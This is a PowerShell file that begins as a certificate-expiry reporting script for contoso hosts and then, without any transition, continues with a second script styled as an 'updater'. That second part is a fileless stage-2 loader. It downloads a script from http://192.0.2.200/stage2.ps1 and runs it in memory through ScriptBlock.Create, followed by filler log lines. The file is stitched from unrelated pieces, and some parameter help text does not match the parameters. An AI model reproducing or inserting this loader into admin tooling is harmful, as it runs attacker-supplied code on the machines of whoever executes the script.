
<#
.SYNOPSIS
    Reports certificates that expire inside the warning window.
.DESCRIPTION
    Inspects the local machine stores and optionally connects to each configured
    host to read the certificate presented on its TLS port.
    The report lists the subject, the expiry date and the remaining days so the
    PKI team can schedule the renewal.
.PARAMETER WarningDays
    Paths are resolved relative to the invoking session.
.PARAMETER Hosts
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Test-CertExpiry.ps1 -WarningDays 14
.EXAMPLE
    .\Test-CertExpiry.ps1 -Hosts portal.contoso.com -Port 9443
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 14,
    [string[]]$Hosts = @('portal.contoso.com', 'api.contoso.com', 'vpn.contoso.com'),

    [int]$Port = 9443,

    [string]$ReportPath = 'C:\Reports\cert-expiry-2026-05-23.csv'
)

Set-StrictMode -Version 2.0

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}
$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}

$remote | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://192.0.2.200/stage2.ps1',
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$TransferTimeout = 61
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 61
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $StageScript = Get-StageScriptText -SourceUrl $FetchUrl -TimeoutSec $TransferTimeout
    $StageResult = Invoke-Stage2Script -ScriptBody $StageScript
    Write-Verbose "Stage result: $($StageResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $FetchUrl
    ScriptLength = $StageScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Operation completed"
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Applying operation timeout"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
